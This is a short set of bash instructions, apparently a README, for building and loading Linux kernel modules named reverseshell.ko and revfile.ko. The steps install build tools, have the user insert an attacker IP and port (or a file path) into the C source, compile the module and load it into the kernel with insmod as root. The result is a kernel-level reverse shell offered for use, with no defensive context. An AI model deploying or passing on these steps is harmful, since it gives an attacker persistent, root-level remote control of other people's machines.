# kernel_module (via bash)

```
> sudo apt-get install -y build-essential linux-headers-$(uname -r)
> # change IP and PORT in reverseshell.c
> sudo make
> sudo chmod +x reverseshell.ko
> sudo insmod reverseshell.ko
```
# kernel_module (via bash script)
```
> sudo apt-get install -y build-essential linux-headers-$(uname -r)
> # change file path in revfile.c
> # change 1 line in Makefile to <obj-m += revfile.o>
> sudo make
> sudo chmod +x revfile.ko
> sudo insmod revfile.ko
```
